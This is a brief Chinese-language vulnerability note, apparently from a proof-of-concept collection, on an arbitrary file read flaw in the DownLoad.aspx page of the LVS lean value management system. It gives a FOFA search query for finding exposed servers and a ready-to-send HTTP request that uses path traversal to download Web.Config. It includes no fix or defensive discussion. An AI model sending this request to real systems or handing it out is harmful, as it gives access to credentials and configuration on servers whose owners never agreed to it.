## LVS精益价值管理系统DownLoad.aspx存在任意文件读取漏洞



## fofa

```
body="/ajax/LVS.Core.Common.STSResult,LVS.Core.Common.ashx"
```
![image](https://github.com/user-attachments/assets/2c5c2b19-128c-4635-810d-b0783bbe2c44)
/Business/UserLogin.aspx


## poc

```
GET /Business/DownLoad.aspx?p=UploadFile/../Web.Config HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip, deflate
Accept: */*
Connection: keep-alive
```

